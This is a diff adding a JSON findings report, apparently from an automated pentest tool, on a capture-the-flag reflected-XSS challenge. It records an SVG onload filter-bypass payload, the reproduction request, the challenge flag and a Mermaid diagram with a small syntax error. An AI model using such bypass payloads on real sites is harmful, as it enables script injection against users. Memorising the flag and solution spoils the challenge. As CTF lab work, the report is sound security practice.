@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:29:05.519473+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a9a11ce7-db8d-48c3-b26a-520bc4ed645d",
+      "timestamp": "2026-04-12T21:29:05.519379+00:00",
+      "title": "Reflected XSS - Dalgona Challenge #14 Filter Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:58445/page?name=",
+      "description": "The /page endpoint reflects the 'name' GET parameter directly into the HTML response. The server filters forward slashes (/) and certain HTML tags (script, img) but does NOT filter SVG/body event handlers with space separators. Using '<svg onload=alert(\"XSS\")>' bypasses all filters and executes JavaScript. The CTF flag was returned upon successful XSS execution.",
+      "evidence": "GET /page?name=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E returned:\nCongratulations!\nHere is the flag: flag{ad00f199-e499-4836-b75a-7e2b7842aa59}\n\nPayload: <svg onload=alert('XSS')>\nFilter bypass: Server strips '/' so '<svg/onload=...>' becomes '<svgonload=...>' (broken). Using space '<svg onload=...>' keeps SVG element intact with event handler.",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:58445/page?name=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E",
+        "expected": "flag{ad00f199-e499-4836-b75a-7e2b7842aa59}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "2d2a5c98-fd57-4029-b79e-fc09a8b60e8c",
+      "timestamp": "2026-04-12T21:29:16.434247+00:00",
+      "title": "Dalgona XSS Challenge #14 - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Attacker)\"] --> Home[\"GET / - Home Page\"]\n  Home --> Page[\"GET /page?name= - XSS Challenge\"]\n  Page --> Filter[\"Server-side Filter\\n(strips: script, img tags, slash /)\"] \n  Filter --> Reflect[\"Reflected Output in HTML\"]\n  Filter --> Success[\"Success State\\n+ Flag Revealed\"]\n  Filter --> Fail[\"Failed State\\n(plain text input)\"]\n  Filter --> Start[\"Start State\\n(blocked tags = empty result)\"]\n  Page --> Static[\"Static Assets\\n/static/css/xss/xss14.css\\n/static/img/\"]\n  Attacker[\"XSS Payload\"] -->|\"svg onload=alert\"] Success"
+    }
+  ]
+}
